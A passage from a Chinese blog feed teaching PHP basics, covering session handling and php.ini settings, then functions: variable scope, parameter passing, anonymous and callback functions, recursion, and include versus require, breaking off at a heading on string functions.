href="#session的原理" class="headerlink" title="session的原理"></a>session的原理</h3><p>​客户端第一次登录网站的时候服务器会分配给它一个不重复的号码(sessionid)给客户端，客户端将sessionid放在cookie里面，在创建sessionid的同时会在服务器端创建一个文件（文件的文件名通常和sessionid一样）放在指定的目录下，当下次用户请求这个网站的页面的时候sessionid通过cookie带过来，然后在存储session文件的文件夹里面找对应的文件。从里面拿值</p><h3 id="session的使用"><a href="#session的使用" class="headerlink" title="session的使用"></a>session的使用</h3><h4 id="1、session-start"><a href="#1、session-start" class="headerlink" title="1、session_start( );"></a>1、session_start( );</h4><p>开启session（只有开启了session才能告诉PHP要调用session的机制）<br>            注意：<br>                1)、第一次的时候会想客户端发送session id。创建sessionid的文件</p><p>​                2)、以后使用的时候，根据HTTP协议带过来的session值，找服务器里面的session文件</p><p>​3)、默认关闭浏览器就失效</p><h4 id="2、设置session"><a href="#2、设置session" class="headerlink" title="2、设置session"></a>2、设置session</h4><p>$_SESSION[“名字”] &#x3D; 值;</p><h4 id="3、获取session"><a href="#3、获取session" class="headerlink" title="3、获取session"></a>3、获取session</h4><p>$_SESSION[“名字”];</p><h4 id="4、删除session"><a href="#4、删除session" class="headerlink" title="4、删除session"></a>4、删除session</h4><p>​步骤：</p><p>​                1)、session_start();</p><p>​                2)、清空session数组&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;unset($_SESSION);</p><p>​                3)、删除session文件&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;session_destroy();</p><p>​                4)、删除客户端的sessionid，注意删除sessionid的时候路径必须加上为 &#x2F;</p><p>​               setcookie(session_name(),’&amp;nbsp;’,time()-1,’&#x2F;‘);</p><p>​               session_name(); &#x2F;&#x2F;获得session的名字</p><p>​               session_id();&#x2F;&#x2F;获得session的id       </p><h3 id="session在php-ini中的配置"><a href="#session在php-ini中的配置" class="headerlink" title="session在php.ini中的配置"></a>session在php.ini中的配置</h3><p>​session.save_handler&#x3D;files     &#x2F;&#x2F;session的保存形式</p><pre><code>       session.cookie_lifetime=0    //session的生命周期</code></pre><p>​           session.name &#x3D; PHPSESSID     &#x2F;&#x2F;设置sessionid的保存名称 </p><p>​           session.auto_start &#x3D; 0     &#x2F;&#x2F;设置是否自动启动session</p><p>​           session.save_path&#x3D;”D:&#x2F;xampp&#x2F;tmp” &#x2F;&#x2F;session文件的保存路径</p><h1 id="小结尾"><a href="#小结尾" class="headerlink" title="小结尾"></a>小结尾</h1><p>一门编程语言的内容实在是太多了，所以分成了四个部分，详情如下：</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP">第一部分</a>：基本语法、数据类型、PHP运算符、流程控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP2/">第二部分</a>：函数、数组、正则</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP3/">第三部分</a>：错误控制、时间戳、文件处理、文件上传、会话控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP类和对象/">第四部分</a>：PHP的类和对象</p>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP——第二部分</title>
      <link href="/2022/09/10/PHP2/"/>
      <url>/2022/09/10/PHP2/</url>
      
        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    <span class="keyword">return</span> <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>包含一段代码，可以通过函数名进行反复调用</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1.变量要先定义赋值才能输出，但是函数的定义和调用是不分先后顺序的</p><p>2.函数定义后，不调用就不执行</p><p>3.函数名不区分大小写，但是推荐一致</p><h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><p>由于函数的出现，导致变量的能见度（生命周期）不同.  共划分为：全局变量、局部变量、 静态变量</p><h3 id="1-全局变量"><a href="#1-全局变量" class="headerlink" title="1.全局变量"></a>1.全局变量</h3><p>在函数外定义的变量</p><p>作用域：整个php文件都可以被使用的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">10</span>;<span class="comment">//定义一个全局变量</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)//定义一个函数<span class="title">demo</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$a</span>;<span class="comment">//使用外部的全局变量$a;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//输出10</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">//输出为空，因为没有使用global调用全局变量</span></span><br><span class="line">        <span class="variable">$a</span> = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">demo</span>();<span class="comment">//调用函数demo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//100</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2.局部变量"></a>2.局部变量</h3><p>在函数中定义的变量</p><p>作用域：只能在函数内部使用，可以使用return将值返回，函数结束时，会被自动销毁</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//变量的作用域：局部变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">100</span>;<span class="comment">//函数内定义变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">//将变量a的值返回</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>(); <span class="comment">//调用函数fun</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">//没有输出，在函数内定义的变量，在函数外是无法使用的</span></span><br></pre></td></tr></table></figure><h3 id="3-静态变量"><a href="#3-静态变量" class="headerlink" title="3.静态变量"></a>3.静态变量</h3><p>在函数中使用static定义的变量</p><p>作用域：只能在函数内部使用，函数结束时，不会被销毁，下一次执行时还能使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">static</span> <span class="variable">$i</span>=<span class="number">1</span>; <span class="comment">//在当前脚本中连续多次调用本函数，i依然有效，里面的静态声明（初始化）只会调用一次。</span></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fun</span>();  <span class="comment">//2</span></span><br><span class="line">    <span class="title function_ invoke__">fun</span>();  <span class="comment">//3</span></span><br><span class="line">    <span class="title function_ invoke__">fun</span>();  <span class="comment">//4</span></span><br></pre></td></tr></table></figure><h2 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h2><h3 id="1-值传递"><a href="#1-值传递" class="headerlink" title="1.值传递"></a>1.值传递</h3><p>普通传值，实参比形参权重高</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//假设函数的功能是求任意两个数的和.   如果求 4 与 7 的和. 这两个数就叫参数.</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)              // 小括号中称为  参数列表</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;两个数的和是: &#x27;</span>.(<span class="variable">$a</span>+<span class="variable">$b</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">xxoo</span>(<span class="number">4</span>, <span class="number">7</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     4,  7  是实际参数</span></span><br><span class="line"><span class="comment">    $a, $b  是形式参数</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    函数调用时, 会把实参赋值给形参  $a = 4      $b = 7</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-默认参数值"><a href="#2-默认参数值" class="headerlink" title="2.默认参数值"></a>2.默认参数值</h3><p>可以在定义函数时，将部分参数提前附上初始值，当被调用时没有给这参数传值，就会采用默认值，以保障函数正常使用.  要求默认值从参数的右边开始。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;两个数的和是: &#x27;</span>.(<span class="variable">$a</span>+<span class="variable">$b</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">xxoo</span>( );   <span class="comment">// 调用函数时, 没有实际参数,会报错</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"><span class="variable">$a</span> = <span class="number">3</span>, <span class="variable">$b</span> = <span class="number">8</span></span>)      // 设置默认值</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;两个数的和是: &#x27;</span>.(<span class="variable">$a</span>+<span class="variable">$b</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">xxoo</span>( );     <span class="comment">// 调用函数时, 没有实际参数, $a就是3, $b就是8 </span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">xxoo</span>(<span class="number">2</span>, <span class="number">4</span>);  <span class="comment">// 调用函数时, $a=2  $b=4</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">xxoo</span>( <span class="number">7</span> );   <span class="comment">// 调用函数时, $a=7  $b为默认值8 , </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-引用方式传值"><a href="#3-引用方式传值" class="headerlink" title="3.引用方式传值"></a>3.引用方式传值</h3><p>使用&amp;符来实现引用传递，就是将参数直接给函数使用。（起别名）</p><p>假如函数内容发生改变，会使当前参数也发生改变。</p><p>让实参和形参建立引用关系</p><p><strong>注意:</strong> 调用引用参数(实参)时，必须使用变量，不可以直接用值,  否则不能建立引用关系</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"> &amp;<span class="variable">$a</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span>++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="title function_ invoke__">xxoo</span>( <span class="variable">$x</span> );  <span class="comment">// 相当于  $a = &amp;$x;   函数操作$a, 就是操作了$x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;     <span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-可变长度参数列表"><a href="#4-可变长度参数列表" class="headerlink" title="4.可变长度参数列表"></a>4.可变长度参数列表</h3><p>func_get_args()&#x2F;&#x2F;以数组的方式返回所有的参数信息</p><p>func_get_arg($index) &#x2F;&#x2F;获取指定参数位置（index：从0开始的整数）的信息</p><p>func_num_args()&#x2F;&#x2F;获取参数的个数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//可变长度参数列表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//echo &quot;参数的个数：&quot;.func_num_args().&quot;&lt;br/&gt;&quot;;</span></span><br><span class="line"><span class="comment">//echo &quot;某个参数的值：&quot;.func_get_arg(4).&quot;&lt;br/&gt;&quot;;</span></span><br><span class="line"><span class="variable">$sum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">func_num_args</span>();<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">func_get_arg</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="variable">$sum</span>+=<span class="title function_ invoke__">func_get_arg</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;共计：&quot;</span>.<span class="variable">$sum</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">demo</span>(<span class="number">10</span>,<span class="number">20</span>,<span class="number">50</span>,<span class="number">60</span>,<span class="number">300</span>,<span class="number">100</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure><h3 id="5-返回值"><a href="#5-返回值" class="headerlink" title="5.返回值"></a>5.返回值</h3><p>1.return后面可以是任何类型的值</p><p>2.不写return，或者只写return,函数返回值为null</p><p>3.return 下面的语句不会被执行，因为return 的意思是函数结束，并且返回到调用这个函数的位置</p><h3 id="6-调用"><a href="#6-调用" class="headerlink" title="6.调用"></a>6.调用</h3><p><strong>函数执行后, 总是返回到之前调用它的地方.</strong></p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;aaaaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;xxoo&#x27;</span>;</span><br><span class="line">    <span class="variable">$x</span>();         <span class="comment">// 相当于调用了 xxoo()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>也叫闭包函数 允许指定一个没有名称的函数。通常把函数定义代码赋值给一个变量，通过变量来调用 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$x</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;aaaaa&#x27;</span>;  </span><br><span class="line">&#125;;</span><br><span class="line">    <span class="variable">$x</span>();         <span class="comment">// 相当于调用了 xxoo()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用匿名函数获取全局变量值</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">100</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$a</span>;   <span class="comment">// 100  </span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$z</span>()</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>指调用函数的时候将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数，使用回调函数是为了可以将一段自己定义的功能传到函数内部使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;aaaaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">base</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$x</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">base</span>(<span class="string">&#x27;xxoo&#x27;</span>);    <span class="comment">// $x=&#x27;xxoo&#x27;;  $x() =&gt; xxoo()</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">base</span>(function()&#123; <span class="keyword">echo</span> <span class="string">&#x27;bbbbb&#x27;</span>; &#125;); <span class="comment">// $x=函数定义  $x()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><p>1.函数内部可以调用其它函数.  递归函数可以看成 函数在内部调用自己.</p><p>2.函数自己调用自己, 会造成死循环. 必须满足某些条件后, 使它不会调用自己.</p><p>3.一般, 当参数满足某个条件时,就不调用自己</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/* 该函数只作说明, 没有实际意义 */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params"> <span class="variable">$n</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$n</span> &gt; <span class="number">1</span>) &#123;          <span class="comment">// 当参数大于1时, 调用自己</span></span><br><span class="line">             <span class="title function_ invoke__">xxoo</span>( <span class="variable">$n</span>-<span class="number">1</span> );</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;               <span class="comment">// 当参数不大于1时, 直接返回</span></span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_ invoke__">xxoo</span>( <span class="number">5</span> )</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//递归累加</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"> <span class="variable">$m</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$m</span>==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$m</span>+<span class="title function_ invoke__">sum</span>(<span class="variable">$m</span>-<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">sum</span>( <span class="number">10</span> );</span><br></pre></td></tr></table></figure><h3 id="引入文件"><a href="#引入文件" class="headerlink" title="引入文件"></a>引入文件</h3><p>把自定义的函数放到一个文件中，然后把文件加载进来，就可以使用那些函数了</p><p><strong>include</strong>加载文件，如果有错，之后的代码依然执行</p><p><strong>include_once</strong>加载文件，多次书写只会加载一次，从而避免了重复加载而报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;文件名&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;文件名&#x27;</span>);   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>require</strong>    加载文件, 如果有错, 程序结束, 后面的代码不会执行 </p><p><strong>require_once</strong>   加载文件, 多次书写只会加载一次, 如果报错, 就不会往后执行  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;文件名&#x27;</span>;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;文件名&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不推荐用 include_once  和 require_once  , 其检查重复功能会耗费资源.</p><p>include和require后面加不加括号对执行结果没有区别，但是加上括号效率较低，所以后面能不加括号就不加括号</p><p><strong>include 和 require的区别</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;不存在的文件名&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;不存在的文件名&#x27;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">require 和 include 几乎完全一样，除了处理失败的方式不同之外。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">include 引入不存在文件时产生一个Warning 脚本会继续往下执行  （适合导入不重要的文件）</span></span><br><span class="line"><span class="comment">require 引入不存在文件时产生一个Fatal Error 脚本不会继续往下执行  （适合导入重要文件）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="如何认识系统函数"><a href="#如何认识系统函数" class="headerlink" title="如何认识系统函数"></a>如何认识系统函数</h3><p>功能  要了解本函数的实现功能</p><p>参数   调用函数需要哪些参数（可选和必选）以及类型   <strong>注意</strong>   参数是否为引用方式 <strong>&amp;</strong></p><p>返回值   本函数都有什么返回结果</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool settype ( mixed &amp;$var , string $type )</span><br><span class="line"></span><br><span class="line">伪类型：</span><br><span class="line"></span><br><span class="line">mixed，说明一个参数可以接受多种不同的类型。</span><br><span class="line"></span><br><span class="line">number，说明一个参数可以是整型或浮点型。 </span><br><span class="line"></span><br><span class="line">callback，说明参数是一个回调函数。  array_reduce() </span><br><span class="line"></span><br><span class="line">void，如果作为返回类型，意味着函数的返回值是没有用的。作为参数列表中的内容意味着不接受任何参数</span><br></pre></td></tr></table></figure><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" 